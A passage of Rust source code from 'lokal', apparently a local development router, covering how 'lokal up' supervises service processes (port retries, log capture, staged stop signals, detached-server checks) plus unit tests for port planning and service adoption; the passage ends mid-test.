    /// lokal's own line about it, into its log as `lokal: …`.
    fn note(&mut self, p: &mut Printer, text: &str) {
        let w = self.log.borrow_mut().lokal(text);
        if let Some(w) = w {
            p.warn(&w);
        }
    }

    /// A warning about it: on stderr as `warning: <sub>: …`, and in its log.
    fn warn(&mut self, p: &mut Printer, text: &str) {
        p.warn(&format!("{}: {text}", self.job.sub));
        self.note(p, &format!("warning: {text}"));
    }
}

/// Starts the retry of run `i` off the main loop: its route's state write
/// and reload ([`retry_route`]), reported to `tx` as [`Event::Moved`].
fn move_to_new_port(i: usize, s: &Svc, paths: &Paths, project: &str, tx: &mpsc::Sender<Event>) {
    let (paths, project, sub) = (paths.clone(), project.to_string(), s.job.sub.clone());
    let (old, tx) = (s.job.port, tx.clone());
    tokio::spawn(async move {
        let result = tokio::task::spawn_blocking(move || retry_route(&paths, &project, &sub, old))
            .await
            .unwrap_or_else(|e| Err(anyhow::Error::new(e)));
        let _ = tx.send(Event::Moved { svc: i, result }).await;
    });
}

/// A retry's route (§4.11, "A port that's taken after all"): one state write,
/// made only if the service is still managed and still has `old`
/// ([`move_port`]), and one reload that waits until its name is ready, so
/// the URL goes to the new port before the command starts again. `None` if
/// the service changed in the meantime. `lokal up` still holds the
/// project's lock.
fn retry_route(paths: &Paths, project: &str, sub: &str, old: u16) -> Result<Option<u16>> {
    let mut pick = |taken: &BTreeSet<u16>| net::pick_port(taken);
    let moved = State::update(paths, |st| move_port(st, project, sub, old, &mut pick))?;
    let Some((port, fqdn)) = moved else {
        return Ok(None);
    };
    // Not set up, or not running: the servers still work on localhost,
    // as at the start.
    projects::apply(paths, &[fqdn], &[])?;
    Ok(Some(port))
}

/// Run `i`'s retry has its route: `note: web's port 51234 was taken;
/// retrying on 51302`, and a second run on the new port takes over. If the
/// route changed in the meantime, or the change failed, the exit stands as
/// reported. While stopping, nothing starts.
fn moved(
    i: usize,
    result: Result<Option<u16>>,
    svcs: &mut Vec<Svc>,
    p: &mut Printer,
    stopping: bool,
    tx: &mpsc::Sender<Event>,
) {
    let s = &mut svcs[i];
    s.retry = Retry::No;
    if stopping {
        return;
    }
    let (sub, old) = (s.job.sub.clone(), s.job.port);
    match result {
        Ok(Some(port)) => {
            let note = format!("port {old} was taken; retrying on {port}");
            s.note(p, &note);
            p.note(&format!("{sub}'s {note}"));
            s.retry = Retry::Replaced;
            let next = Svc::new(
                s.of,
                s.job.on_port(port),
                s.label.clone(),
                Rc::clone(&s.log),
                Retry::No,
                s.hinted,
            );
            let n = svcs.len();
            svcs.push(next.start(n, tx, p));
        }
        Ok(None) => {
            let note = format!(
                "port {old} was taken; not retrying, because its route changed while lokal up ran"
            );
            s.note(p, &note);
            p.note(&format!("{sub}'s {note}"));
        }
        Err(e) => s.warn(p, &format!("cannot retry on a new port: {e:#}")),
    }
}

/// Reads one pipe line by line into `tx`, then reports it closed.
fn read_pipe(
    svc: usize,
    stream: Stream,
    pipe: impl AsyncRead + Unpin + Send + 'static,
    tx: mpsc::Sender<Event>,
) {
    tokio::spawn(async move {
        let mut r = BufReader::new(pipe);
        let (mut buf, mut carry) = (Vec::new(), Vec::new());
        loop {
            buf.clear();
            // At most MAX_LINE bytes: a longer line comes in pieces. Not
            // `lines()`, which fails on invalid UTF-8.
            let n = match (&mut r)
                .take(MAX_LINE as u64)
                .read_until(b'\n', &mut buf)
                .await
            {
                Ok(0) | Err(_) => break,
                Ok(n) => n,
            };
            let text = take_line(&buf, n == MAX_LINE, &mut carry);
            if tx.send(Event::Line { svc, stream, text }).await.is_err() {
                return;
            }
        }
        if !carry.is_empty() {
            let text = String::from_utf8_lossy(&carry).into_owned();
            let _ = tx.send(Event::Line { svc, stream, text }).await;
        }
        let _ = tx.send(Event::Closed { svc }).await;
    });
}

/// The text of a line `read_until` returned, after `carry` (§4.11): the line
/// ending (`\n` or `\r\n`) stripped, and invalid UTF-8 replaced. When `split`
/// (the line went on past [`MAX_LINE`]), a character cut in two at the end
/// moves to `carry`, the start of the next piece, so it isn't replaced.
fn take_line(chunk: &[u8], split: bool, carry: &mut Vec<u8>) -> String {
    let mut bytes = std::mem::take(carry);
    bytes.extend_from_slice(chunk);
    if let Some(b) = bytes.strip_suffix(b"\n") {
        let b = b.strip_suffix(b"\r").unwrap_or(b);
        return String::from_utf8_lossy(b).into_owned();
    }
    if split {
        let cut = bytes.len() - incomplete_tail(&bytes);
        *carry = bytes.split_off(cut);
    }
    String::from_utf8_lossy(&bytes).into_owned()
}

/// How many bytes at the end of `b` are an incomplete UTF-8 character: a
/// lead byte without all of its continuation bytes.
fn incomplete_tail(b: &[u8]) -> usize {
    for back in 1..=b.len().min(4) {
        let c = b[b.len() - back];
        if c & 0xC0 != 0x80 {
            let need = match c {
                0xC0..=0xDF => 2,
                0xE0..=0xEF => 3,
                0xF0..=0xF7 => 4,
                _ => 1,
            };
            return if need > back { back } else { 0 };
        }
    }
    0
}

/// lokal's stdout and stderr while the commands run. A failed write (a
/// closed pipe or terminal) sets `broken`, which stops the services: with
/// SIGPIPE caught, lokal would otherwise go on without anyone reading, and
/// with it not caught, die and leave them running.
#[derive(Default)]
struct Printer {
    /// `stopping N services…` waits on stdout for its ` done.`.
    open: bool,
    broken: bool,
}

impl Printer {
    fn line(&mut self, to: Stream, s: &str) {
        self.end_open();
        self.write(to, &format!("{s}\n"));
    }

    /// Starts a line that [`Printer::done`] ends, unless another line comes
    /// first.
    fn open(&mut self, s: &str) {
        self.end_open();
        self.write(Stream::Out, s);
        self.open = true;
    }

    fn done(&mut self) {
        let s = "done. Routes kept; 'lokal down' removes them.";
        if self.open {
            self.open = false;
            self.write(Stream::Out, &format!(" {s}\n"));
        } else {
            self.line(Stream::Out, s);
        }
    }

    fn end_open(&mut self) {
        if self.open {
            self.open = false;
            self.write(Stream::Out, "\n");
        }
    }

    fn write(&mut self, to: Stream, s: &str) {
        let r = match to {
            Stream::Out => {
                let mut o = std::io::stdout().lock();
                o.write_all(s.as_bytes()).and_then(|()| o.flush())
            }
            Stream::Err => std::io::stderr().lock().write_all(s.as_bytes()),
        };
        if r.is_err() {
            self.broken = true;
        }
    }

    fn warn(&mut self, s: &str) {
        self.line(Stream::Err, &format!("{} {s}", out::yellow("warning:")));
    }

    /// `  note: …`, as `out::note` prints it.
    fn note(&mut self, s: &str) {
        self.line(Stream::Out, &format!("  {} {s}", dim("note:")));
    }
}

/// Stopping, from the first signal (SPEC §4.11, "Stopping").
struct Stop {
    /// The first signal's number: lokal exits with 128 + it.
    signal: i32,
    since: Instant,
    termed: bool,
    killed: Option<Instant>,
}

impl Stop {
    /// Prints `stopping N services…` and sends SIGINT to every group still
    /// alive. A retry that isn't set up yet won't be, and a port still
    /// watched after an exit 0 isn't any more.
    fn begin(signal: i32, svcs: &mut [Svc], p: &mut Printer) -> Self {
        for s in svcs.iter_mut() {
            s.end_watch(p);
        }
        // Services, not runs: a replaced run's group may still be alive.
        let n = svcs
            .iter()
            .filter(|s| s.running())
            .map(|s| s.of)
            .collect::<BTreeSet<_>>()
            .len();
        p.open(&format!(
            "stopping {n} service{}…",
            if n == 1 { "" } else { "s" }
        ));
        for s in svcs.iter_mut() {
            s.stop_probing();
            if matches!(s.retry, Retry::Deciding { .. }) {
                s.retry = Retry::No;
            }
            s.signal(GroupSignal::Interrupt, p);
        }
        Self {
            signal,
            since: Instant::now(),
            termed: false,
            killed: None,
        }
    }

    fn kill(&mut self, svcs: &mut [Svc], p: &mut Printer) {
        self.killed = Some(Instant::now());
        for s in svcs.iter_mut() {
            s.signal(GroupSignal::Kill, p);
        }
    }

    /// SIGTERM at 5s, SIGKILL at 10s, and then stop waiting for what
    /// SIGKILL can't end.
    fn tick(&mut self, svcs: &mut [Svc], p: &mut Printer) {
        if !self.termed && self.since.elapsed() >= TERM_AFTER {
            self.termed = true;
            for s in svcs.iter_mut() {
                s.signal(GroupSignal::Terminate, p);
            }
        }
        match self.killed {
            None if self.since.elapsed() >= KILL_AFTER => self.kill(svcs, p),
            Some(at) if at.elapsed() >= GIVE_UP_AFTER_KILL => {
                for s in svcs.iter_mut().filter(|s| s.running()) {
                    s.abandoned = true;
                    let pgid = s.pgid;
                    s.warn(
                        p,
                        &format!(
                            "process group {pgid} still has processes after SIGKILL (another user's?); not waiting for them"
                        ),
                    );
                }
            }
            _ => {}
        }
    }
}

/// Starts every command, prints their output and the ready line, and runs
/// until every one has exited and every process group is empty, or a signal
/// stops them (SPEC §4.11). Each started service's output, and lokal's own
/// lines about it, also go to its log in `project`'s folder. Along the way it
/// gives a service that listens on another port the wrong-port hint, and
/// retries one whose own port turned out to be taken, once, on a new port
/// (a state write and a reload, under the project's lock that `up` holds),
/// or gives one that said a port is in use while its own is free a hint.
/// After a command exits 0, it looks whether its server left the process
/// group and still runs, records such a server in `record` ([`Detached`],
/// written next to the lock), and names those that still run before it
/// returns. Returns lokal's exit code. Needs the trust check's
/// [`Approved`]: this is the only place a `run` command starts.
async fn supervise(
    _approved: Approved,
    jobs: Vec<Start>,
    url_works: bool,
    paths: &Paths,
    project: &str,
    mut record: Vec<Detached>,
) -> Result<i32> {
    // Before the first shell starts, so that from then on lokal survives a
    // signal or a closed pipe and stops the services instead.
    let mut signals = RelaySignals::install().context("cannot catch signals")?;
    platform::catch_sigpipe().context("cannot catch SIGPIPE")?;
    let width = jobs
        .iter()
        .map(|j| j.sub.chars().count())
        .max()
        .unwrap_or(0);
    // The main loop keeps a sender: a retry starts a run, and the hint's
    // lookups report through it too.
    let (tx, mut rx) = mpsc::channel(EVENTS);
    let mut p = Printer::default();
    let started = Instant::now();
    let mut svcs = Vec::with_capacity(jobs.len());
    for (i, job) in jobs.into_iter().enumerate() {
        let label = out::service_color(i, &format!("{:<width$} |", job.sub));
        // Truncated as the service starts; services this `up` doesn't
        // start keep their old logs.
        let (log, warning) = ServiceLog::start(paths, project, &job.sub);
        if let Some(w) = warning {
            p.warn(&w);
        }
        let retry = if job.fixed { Retry::No } else { Retry::Allowed };
        let run = Svc::new(i, job, label, Rc::new(RefCell::new(log)), retry, false);
        svcs.push(run.start(i, &tx, &mut p));
    }
    let mut poll = tokio::time::interval(POLL_EVERY);
    poll.set_missed_tick_behavior(MissedTickBehavior::Delay);
    let mut stop: Option<Stop> = None;
    let mut announced = false;
    loop {
        // Before the ready line, which waits for a retry being decided.
        for (i, s) in svcs.iter_mut().enumerate() {
            if s.decide(&mut p) {
                move_to_new_port(i, s, paths, project, &tx);
            }
        }
        if !announced && stop.is_none() && !svcs.iter().any(Svc::pending) {
            announced = true;
            print_ready(&mut p, &svcs, started.elapsed(), url_works);
        }
        if stop.is_none() && p.broken {
            stop = Some(Stop::begin(platform::SIGPIPE, &mut svcs, &mut p));
        }
        if svcs.iter().all(Svc::finished) {
            break;
        }
        tokio::select! {
            Some(ev) = rx.recv() => {
                if let Some((sub, port, left)) = on_event(ev, &mut svcs, &mut p, stop.is_some(), &tx) {
                    add_detached(&mut record, &sub, port, &left);
                    write_detached(paths, project, &record);
                }
            }
            sig = signals.recv() => match &mut stop {
                None => stop = Some(Stop::begin(sig.number(), &mut svcs, &mut p)),
                // Any second signal: SIGKILL at once.
                Some(st) => st.kill(&mut svcs, &mut p),
            },
            _ = poll.tick() => {
                let now = Instant::now();
                for s in svcs.iter_mut() {
                    s.look();
                    if matches!(s.detach, Detach::Watching { until } if now >= until) {
                        s.end_watch(&mut p);
                    }
                }
                match &mut stop {
                    Some(st) => st.tick(&mut svcs, &mut p),
                    None => {
                        for (i, s) in svcs.iter_mut().enumerate() {
                            if s.lookup_due() {
                                s.look_up_listeners(i, &tx);
                            }
                        }
                    }
                }
                // Nothing queued from the pipes: a pipe still open this long
                // after its group emptied is held from outside the group.
                if rx.is_empty() {
                    for s in svcs.iter_mut() {
                        let waited = s.empty_at.is_some_and(|t| t.elapsed() >= PIPE_GRACE);
                        if waited && s.code.is_some() && s.open_pipes > 0 && !s.abandoned {
                            s.abandoned = true;
                            s.report_exit(&mut p);
                            s.warn(
                                &mut p,
                                "a process it started left its process group and still holds its output; lokal can't stop it",
                            );
                        }
                    }
                }
            }
        }
    }
    // Every exit is reported by now; this is only a guard.
    for s in svcs.iter_mut() {
        s.report_exit(&mut p);
    }
    let left = still_running(&svcs).await;
    // A retried service's exit is its last run's.
    let mut last = svcs.iter().filter(|s| s.retry != Retry::Replaced);
    let code = match stop {
        Some(st) => {
            p.done();
            128 + st.signal
        }
        None if last.all(|s| s.code == Some(0)) => 0,
        None => 1,
    };
    if !left.is_empty() {
        p.line(Stream::Out, &keep_running_line(&left));
    }
    Ok(code)
}

/// The servers that the commands left running outside `lokal up` (§4.11,
/// "A server that detaches") which still listen on their ports, as
/// `(sub, server)` in service order: their ports are looked up again (one
/// lsof each, side by side), so lokal doesn't name a server that has
/// stopped since, or a pid that has been reused.
async fn still_running(svcs: &[Svc]) -> Vec<(String, PortOwner)> {
    let mut left_by: Vec<&Svc> = svcs.iter().filter(|s| s.left_outside().is_some()).collect();
    // A retry's run comes after the others in `svcs`.
    left_by.sort_by_key(|s| s.of);
    let lookups: Vec<_> = left_by
        .into_iter()
        .filter_map(|s| {
            let owners = s.left_outside()?.to_vec();
            let port = s.job.port;
            let now =
                tokio::task::spawn_blocking(move || platform::current().system.port_owners(port));
            Some((s.job.sub.clone(), owners, now))
        })
        .collect();
    let mut left = vec![];
    for (sub, owners, now) in lookups {
        let now = now.await.unwrap_or_default();
        for o in owners {
            if now
                .iter()
                .any(|n| n.listening && n.pid == o.pid && n.name == o.name)
            {
                left.push((sub.clone(), o));
            }
        }
    }
    left
}

/// Handles one event. Returns a service's name, port and the servers it
/// left running outside `lokal up`, when a look at its port after an exit 0
/// found them, for the record.
fn on_event(
    ev: Event,
    svcs: &mut Vec<Svc>,
    p: &mut Printer,
    stopping: bool,
    tx: &mpsc::Sender<Event>,
) -> Option<(String, u16, Vec<PortOwner>)> {
    match ev {
        Event::Line { svc, stream, text } => {
            let s = &mut svcs[svc];
            // The log first: once a line is on the terminal, it's in the
            // file too.
            s.log_line(svc, &text, stopping, tx, p);
            if text.is_empty() {
                p.line(stream, &s.label);
            } else {
                p.line(stream, &format!("{} {text}", s.label));
            }
        }
        Event::Closed { svc } => {
            let s = &mut svcs[svc];
            s.open_pipes -= 1;
            if s.open_pipes == 0 {
                s.report_exit(p);
            }
        }
        Event::Exited { svc, code } => svcs[svc].exited(svc, code, stopping, tx, p),
        Event::Ready { svc } => svcs[svc].answered(svc, tx),
        Event::Listens { svc, ports } => svcs[svc].listens(ports, stopping, p),
        Event::OwnPort { svc, taken } => svcs[svc].own_port(taken),
        Event::PortHeld { svc, owners } => {
            let s = &mut svcs[svc];
            if let Some(left) = s.port_held(&owners, p) {
                return Some((s.job.sub.clone(), s.job.port, left));
            }
        }
        Event::Moved { svc, result } => moved(svc, result, svcs, p, stopping, tx),
    }
    None
}

/// Prints [`ready_line`] for the services this `up` started, in their
/// order: a retried service counts once, by its last run, which comes
/// after the others in `svcs`.
fn print_ready(p: &mut Printer, svcs: &[Svc], took: Duration, url_works: bool) {
    let mut last: Vec<&Svc> = svcs.iter().filter(|s| s.retry != Retry::Replaced).collect();
    last.sort_by_key(|s| s.of);
    let counted: Vec<(&str, Counted)> = last
        .iter()
        .map(|s| (s.job.sub.as_str(), s.counted()))
        .collect();
    p.line(Stream::Out, &ready_line(&counted, took, url_works));
}

#[cfg(test)]
mod tests {
    use std::cell::{Cell, RefCell};

    use super::*;
    use crate::project_file::FileService;
    use crate::state::HostHeader;

    fn file(project: &str, domain: Option<&str>, services: &[(&str, Option<u16>)]) -> ProjectFile {
        let apex = domain.map_or_else(|| format!("{project}.lokal"), str::to_string);
        ProjectFile {
            path: PathBuf::from("/r/lokal.toml"),
            digest: "0".repeat(64),
            dir: PathBuf::from("/r"),
            project: project.into(),
            project_derived: false,
            domain: domain.map(str::to_string),
            apex,
            services: services
                .iter()
                .map(|(sub, port)| {
                    (
                        sub.to_string(),
                        FileService {
                            run: format!("run {sub} {{port}}"),
                            port: *port,
                            cwd: PathBuf::from("/r"),
                            host_header: HostHeader::Preserve,
                            env: vec![],
                        },
                    )
                })
                .collect(),
            warnings: vec![],
        }
    }

    fn svc(port: u16, managed: bool) -> Service {
        Service {
            host: "localhost".into(),
            port,
            host_header: HostHeader::Preserve,
            managed: managed.then(|| MANAGED_BY_FILE.to_string()),
            extra: Default::default(),
        }
    }

    /// `(name, domain, services)` of each project.
    type Projects<'a> = &'a [(&'a str, &'a str, &'a [(&'a str, Service)])];

    fn state(projects: Projects<'_>) -> State {
        let mut st = State::default();
        for (name, domain, services) in projects {
            st.projects.insert(
                name.to_string(),
                Project {
                    domain: domain.to_string(),
                    created_at: "2026-10-25T00:00:00Z".into(),
                    services: services
                        .iter()
                        .map(|(s, v)| (s.to_string(), v.clone()))
                        .collect(),
                    extra: Default::default(),
                },
            );
        }
        st
    }

    fn all(f: &ProjectFile) -> BTreeSet<String> {
        f.services.keys().cloned().collect()
    }

    /// A picker that hands out 50000, 50001, … skipping what it's told,
    /// and records every `taken` set it saw.
    struct Picker {
        next: Cell<u16>,
        seen: RefCell<Vec<BTreeSet<u16>>>,
    }

    impl Picker {
        fn new() -> Self {
            Self {
                next: Cell::new(50000),
                seen: RefCell::new(vec![]),
            }
        }

        fn pick(&self, taken: &BTreeSet<u16>) -> Result<u16> {
            self.seen.borrow_mut().push(taken.clone());
            let mut p = self.next.get();
            while taken.contains(&p) {
                p += 1;
            }
            self.next.set(p + 1);
            Ok(p)
        }
    }

    fn plan_with(
        st: &State,
        f: &ProjectFile,
        starts: &BTreeSet<String>,
        busy: &[u16],
        picker: &Picker,
    ) -> Result<Plan> {
        let listening = |p: u16| busy.contains(&p);
        let mut pick = |t: &BTreeSet<u16>| picker.pick(t);
        plan(st, f, starts, &listening, &mut pick)
    }

    fn routes(p: Plan) -> Routes {
        match p {
            Plan::Route(r) => r,
            Plan::Busy(b) => panic!("busy: {b:?}"),
        }
    }

    fn usage_err(r: Result<Plan>) -> UserError {
        let e = r.expect_err("should fail");
        let u = e.downcast_ref::<UserError>().expect("a UserError").clone();
        assert_eq!(u.code, crate::error::EXIT_USAGE, "{}", u.message);
        u
    }

    #[test]
    fn ports_come_from_the_file_then_state_then_a_pick() {
        let st = state(&[
            (
                "shop",
                "shop.lokal",
                &[("api", svc(51234, true)), ("db", svc(5432, false))],
            ),
            ("other", "other.lokal", &[("x", svc(50000, false))]),
        ]);
        let f = file(
            "shop",
            None,
            &[
                ("@", Some(3000)),
                ("api", None),
                ("web", None),
                ("docs", None),
            ],
        );
        let picker = Picker::new();
        let r = routes(plan_with(&st, &f, &all(&f), &[], &picker).unwrap());
        assert_eq!(r.project, "shop");
        // `db` isn't in the file, so nothing is adopted.
        assert!(r.adopted.is_empty());
        let got: Vec<(&str, u16, PortFrom)> = r
            .ports
            .iter()
            .map(|(s, r)| (s.as_str(), r.port, r.from))
            .collect();
        assert_eq!(
            got,
            [
                ("@", 3000, PortFrom::File),
                ("api", 51234, PortFrom::Kept),
                // 50000 is another project's: skipped.
                ("docs", 50001, PortFrom::Picked),
                ("web", 50002, PortFrom::Picked),
            ]
        );
        // Every pick skips every port in state, every fixed port, and the
        // ports picked before it.
        let seen = picker.seen.borrow();
        assert_eq!(seen.len(), 2);
        for want in [51234, 5432, 50000, 3000] {
            assert!(seen.iter().all(|t| t.contains(&want)), "{want}: {seen:?}");
        }
        assert!(seen[1].contains(&50001), "{seen:?}");
    }

    #[test]
    fn a_kept_port_that_another_service_now_fixes_is_picked_again() {
        let st = state(&[("shop", "shop.lokal", &[("api", svc(51234, true))])]);
        let f = file("shop", None, &[("api", None), ("web", Some(51234))]);
        let r = routes(plan_with(&st, &f, &all(&f), &[], &Picker::new()).unwrap());
        assert_eq!(r.ports["web"].port, 51234);
        assert_eq!(r.ports["api"].from, PortFrom::Picked);
        assert_ne!(r.ports["api"].port, 51234);
    }

    fn on(host: &str, s: Service) -> Service {
        Service {
            host: host.into(),
            ..s
        }
    }

    fn upstream(s: Service) -> Service {
        Service {
            host_header: HostHeader::Upstream,
            ..s
        }
    }

    #[test]
    fn a_hand_added_service_with_the_files_route_is_adopted() {
        let st = state(&[(
            "shop",
            "shop.lokal",
            &[
                // The file fixes the same port.
                ("web", svc(3000, false)),
                // No port in the file: it keeps its own.
                ("api", svc(51234, false)),
                // Left by `lokal run docs --host-header upstream`.
                ("docs", upstream(svc(52000, false))),
                ("ok", svc(5000, true)),
                ("db", svc(5432, false)),
            ],
        )]);
        let mut f = file(
            "shop",
            None,
            &[
                ("web", Some(3000)),
                ("api", None),
                ("docs", None),
                ("ok", None),
            ],
        );
        f.services.get_mut("docs").unwrap().host_header = HostHeader::Upstream;
        let picker = Picker::new();
        let r = routes(plan_with(&st, &f, &all(&f), &[], &picker).unwrap());
        let got: Vec<(&str, u16, PortFrom)> = r
            .ports
            .iter()
            .map(|(s, r)| (s.as_str(), r.port, r.from))
            .collect();
        assert_eq!(
            got,
            [
                ("api", 51234, PortFrom::Kept),
                ("docs", 52000, PortFrom::Kept),
                ("ok", 5000, PortFrom::Kept),
                ("web", 3000, PortFrom::File),
            ]
        );
        assert!(picker.seen.borrow().is_empty(), "nothing picked");
        // A managed service isn't adopted: it already is the file's.
        let want: BTreeSet<String> = ["api", "docs", "web"].map(String::from).into();
        assert_eq!(r.adopted, want);
        // The write marks them managed and moves no route; the others stay.
        let mut after = st.clone();
        let synced = apply_plan(&mut after, &f, &r);
        assert!(synced.gone.is_empty());
        let (was, now) = (
            &st.projects["shop"].services,
            &after.projects["shop"].services,
        );
        for sub in ["api", "docs", "web", "ok"] {
            assert!(now[sub].is_managed(), "{sub}");
            assert!(now[sub].same_route(&was[sub]), "{sub}: {:?}", now[sub]);
        }
        assert_eq!(now["db"], svc(5432, false));
        // Once adopted, the next up has nothing to adopt or change.
        let r = routes(plan_with(&after, &f, &all(&f), &[], &Picker::new()).unwrap());
        assert!(r.adopted.is_empty());
        let before = after.clone();
        apply_plan(&mut after, &f, &r);
        assert_eq!(after, before);
        // A busy port fails before the write, so nothing is adopted.
        let p = plan_with(&st, &f, &all(&f), &[51234], &Picker::new()).unwrap();
        assert_eq!(
            p,
            Plan::Busy(Busy {
                sub: "api".into(),
                port: 51234,
                from: PortFrom::Kept
            })
        );
    }

    #[test]
    fn the_adoption_note_names_every_adopted_service() {
        assert_eq!(adopted_note(&BTreeSet::new()), None);
        assert_eq!(
            adopted_note(&BTreeSet::from(["web".to_string()])).as_deref(),
            Some(
                "adopted web (added by hand or by lokal run, with the route lokal.toml gives it); \
lokal down removes it now"
            )
        );
        let several: BTreeSet<String> = ["web", "api", "auth"].map(String::from).into();
        assert_eq!(
            adopted_note(&several).as_deref(),
            Some(
                "adopted api, auth, web (added by hand or by lokal run, with the routes lokal.toml \
gives them); lokal down removes them now"
            )
        );
    }

    #[test]
    fn a_hand_added_service_with_another_route_is_a_clash_that_says_what_differs() {
        let one = |have: Service, port: Option<u16>, hh: HostHeader| {
            let st = state(&[("shop", "shop.lokal", &[("web", have)])]);
            let mut f = file("shop", None, &[("web", port), ("site", Some(3000))]);
            f.services.get_mut("web").unwrap().host_header = hh;
            let e = usage_err(plan_with(&st, &f, &all(&f), &[], &Picker::new()));
            assert_eq!(e.hint.as_deref(), Some("lokal service remove web -p shop"));
            let pre = "service web already exists with another route than lokal.toml gives it (";
            let post = "), and lokal.toml doesn't manage it (added by hand, or left by lokal run)";
            let m = &e.message;
            assert!(m.starts_with(pre) && m.ends_with(post), "{m}");
            m[pre.len()..m.len() - post.len()].to_string()
        };
        use HostHeader::{Preserve, Upstream};
        let cases: &[(Service, Option<u16>, HostHeader, &str)] = &[
            (
                on("127.0.0.1", svc(4000, false)),
                None,
                Preserve,
                "host 127.0.0.1, not localhost",
            ),
            (
                upstream(svc(4000, false)),
                None,
                Preserve,
                "host_header \"upstream\", not \"preserve\"",
            ),
            (
                svc(4000, false),
                None,
                Upstream,
                "host_header \"preserve\", not \"upstream\"",
            ),
            (
                svc(4000, false),
                Some(9904),
                Preserve,
                "port 4000, not 9904",
            ),
            // Kept, it would take the port another service fixes.
            (
                svc(3000, false),
                None,
                Preserve,
                "port 3000, which lokal.toml gives to site",
            ),
            (
                on("db.internal", upstream(svc(4000, false))),
                Some(4001),
                Preserve,
                "host db.internal, not localhost, and port 4000, not 4001, and \
host_header \"upstream\", not \"preserve\"",
            ),
        ];
        for (have, port, hh, want) in cases {
            assert_eq!(one(have.clone(), *port, *hh), *want);
        }
    }

    #[test]
    fn every_clash_is_in_one_error_with_one_command_and_nothing_is_adopted() {
        let st = state(&[(
            "shop",
            "shop.lokal",
            &[
                ("web", on("127.0.0.1", svc(3000, false))),
                ("api", svc(4000, false)),
                ("auth", svc(9901, false)),
                ("db", svc(5432, false)),
            ],
        )]);
        let f = file(
            "shop",
            None,
            &[("web", None), ("api", Some(9904)), ("auth", Some(9901))],
        );
        let e = usage_err(plan_with(&st, &f, &all(&f), &[], &Picker::new()));
        // auth would be adopted, but a clash fails the whole up first.
        assert_eq!(
            e.message,
            "services api, web already exist with other routes than lokal.toml gives them \
(api: port 4000, not 9904; web: host 127.0.0.1, not localhost), and lokal.toml doesn't manage them \
(added by hand, or left by lokal run)"
        );
        assert_eq!(
            e.hint.as_deref(),
            Some("lokal service remove api web -p shop")
        );
        // A service in another project doesn't count.
        let f = file("other", None, &[("web", None)]);
        let r = routes(plan_with(&st, &f, &all(&f), &[], &Picker::new()).unwrap());
        assert!(r.adopted.is_empty());
    }

    #[test]
    fn domain_rules() {
        let st = state(&[("shop", "shop.local", &[]), ("app", "app.lokal", &[])]);
        // A different domain fails as project create does.
        let f = file("shop", Some("shop.lokal"), &[("web", None)]);
        let e = usage_err(plan_with(&st, &f, &all(&f), &[], &Picker::new()));
        assert_eq!(
            e.message,
            "project `shop` already exists with domain shop.local, not shop.lokal"
        );
        assert!(e.hint.unwrap().contains("set domain = \"shop.local\""));
        // The same domain, or no domain key, is fine.
        let f = file("shop", Some("shop.local"), &[("web", None)]);
        routes(plan_with(&st, &f, &all(&f), &[], &Picker::new()).unwrap());
        let f = file("shop", None, &[("web", None)]);
        routes(plan_with(&st, &f, &all(&f), &[], &Picker::new()).unwrap());
        // A new project's apex mustn't overlap another project's.
        let f = file("api", Some("api.app.lokal"), &[("web", None)]);
        let e = usage_err(plan_with(&st, &f, &all(&f), &[], &Picker::new()));
        assert!(
            e.message.contains("overlaps project `app`"),
            "{}",
            e.message
        );
    }

    #[test]
    fn a_busy_port_fails_only_for_services_this_up_starts() {
        let st = state(&[("shop", "shop.lokal", &[("api", svc(51234, true))])]);
        let f = file(
            "shop",
            None,
            &[("@", Some(3000)), ("api", None), ("web", None)],
        );
        // A fixed port.
        let p = plan_with(&st, &f, &all(&f), &[3000], &Picker::new()).unwrap();
        assert_eq!(
            p,
            Plan::Busy(Busy {
                sub: "@".into(),
                port: 3000,
                from: PortFrom::File
            })
        );
        // A kept port is never moved.
        let p = plan_with(&st, &f, &all(&f), &[51234], &Picker::new()).unwrap();
        assert_eq!(
            p,
            Plan::Busy(Busy {
                sub: "api".into(),
                port: 51234,
                from: PortFrom::Kept
            })
        );
        // Services this up only routes keep their ports, busy or not.
        let only_web = BTreeSet::from(["web".to_string()]);
        let r = routes(plan_with(&st, &f, &only_web, &[3000, 51234], &Picker::new()).unwrap());
        assert_eq!(r.ports["@"].port, 3000);
        assert_eq!(r.ports["api"].port, 51234);
    }

    #[test]
    fn apply_creates_the_project_adds_marks_and_removes() {
        let mut st = state(&[
            (
                "shop",
                "shop.local",
                &[
                    ("old", svc(51000, true)),
                    ("db", svc(5432, false)),
                    ("api", svc(51234, true)),
                ],
            ),
            ("other", "other.lokal", &[]),
        ]);
        st.current_project = Some("other".into());
        let mut f = file("shop", None, &[("api", None), ("web", Some(3000))]);
        f.services.get_mut("web").unwrap().host_header = HostHeader::Upstream;
        let r = routes(plan_with(&st, &f, &all(&f), &[], &Picker::new()).unwrap());
        let synced = apply_plan(&mut st, &f, &r);
        // The existing project's domain, not the file's default apex.
        assert_eq!(synced.domain, "shop.local");
        assert_eq!(synced.ready, ["api.shop.local", "web.shop.local"]);
        assert_eq!(synced.gone, ["old.shop.local"]);
        assert_eq!(st.current_project.as_deref(), Some("shop"));
        let p = &st.projects["shop"];
        assert_eq!(p.created_at, "2026-10-25T00:00:00Z");
        assert_eq!(p.services.keys().collect::<Vec<_>>(), ["api", "db", "web"]);
        assert_eq!(p.services["db"], svc(5432, false), "hand-added stays");
        assert_eq!(p.services["api"], svc(51234, true));
        assert_eq!(
            p.services["web"],
            Service {
                host_header: HostHeader::Upstream,
                ..svc(3000, true)
            }
        );
        assert_eq!(synced.services, p.services);
        // Again with the same file: nothing changes.
        let before = st.clone();
        let r = routes(plan_with(&st, &f, &all(&f), &[], &Picker::new()).unwrap());
        let again = apply_plan(&mut st, &f, &r);
        assert_eq!(st, before);
        assert!(again.gone.is_empty());
        assert_eq!(again.ready, synced.ready);
    }

    #[test]
    fn apply_keeps_unknown_fields_of_the_services_it_replaces() {
        let with = |s: Service, extra: toml::Table| Service { extra, ..s };
        let mut st = state(&[(
            "shop",
            "shop.lokal",
            &[
                ("api", with(svc(51234, true), toml::toml! { future = 1 })),
                (
                    "web",
                    with(svc(51300, true), toml::toml! { health = { path = "/up" } }),
                ),
                ("old", with(svc(51000, true), toml::toml! { gone = true })),
                ("db", with(svc(5432, false), toml::toml! { mine = "yes" })),
            ],
        )]);
        let f = file(
            "shop",
            None,
            &[("api", None), ("web", Some(3000)), ("docs", None)],
        );
        let r = routes(plan_with(&st, &f, &all(&f), &[], &Picker::new()).unwrap());
        let synced = apply_plan(&mut st, &f, &r);
        assert_eq!(synced.gone, ["old.shop.lokal"]);
